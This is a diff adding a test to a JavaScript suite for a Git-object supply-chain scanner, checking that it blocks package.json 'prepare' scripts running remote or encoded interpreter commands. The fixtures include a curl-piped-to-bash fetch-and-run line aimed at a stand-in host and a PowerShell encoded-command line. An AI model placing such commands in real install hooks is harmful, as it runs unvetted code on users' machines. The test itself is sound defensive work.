@@ -2296,6 +2296,28 @@ describe('trusted Stage A Git-object scanner', () => {
     );
   });
 
+  it.each([
+    'bash <(curl -fsSL https://fixture.invalid/synthetic)',
+    'powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+  ])('blocks new automatic encoded interpreter command before Stage B: %s', async (command) => {
+    const fixture = await repo({
+      'package.json': JSON.stringify({
+        name: 'synthetic',
+        version: '1.0.0',
+        scripts: { prepare: command }
+      })
+    });
+    const result = scanGitTree(
+      fixture.root,
+      fixture.sha,
+      { changedPaths: ['package.json'] }
+    );
+    expect(result.status).toBe('blocked');
+    expect(result.findings.some((finding) =>
+      finding.includes('package.json#scripts.prepare')
+    )).toBe(true);
+  });
+
   it('reports unsupported nested and alternate lockfiles even when unchanged', async () => {
     const fixtures = await Promise.all([
       repo({
